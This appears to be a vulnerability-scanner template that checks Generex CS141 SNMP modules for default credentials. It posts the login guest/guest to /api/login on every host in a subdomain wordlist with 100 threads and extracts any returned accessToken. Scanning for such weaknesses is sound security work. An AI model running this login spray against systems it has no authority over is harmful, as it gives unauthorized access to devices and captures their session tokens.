id: cs141-default-login 3
info:
  author: socketz
  name: CS141 SNMP Module Default Credentials
  reference: https://www.generex.de/media/pages/packages/documents/manuals/f65348d5b6-1628841637/manual_CS141_en.pdf
  severity: medium
  tags: hiawatha,iot,default-login
requests:
- attack: sniper
  extractors:
  - kval:
    - accessToken
    type: kval
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - accessToken
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'POST /api/login HTTP/1.1

    Host: {{Subdomains}}

    Accept: application/json, text/plain, */*

    Content-Type: application/json


    {"userName":"guest","password":"guest"}

    '
  threads: 100
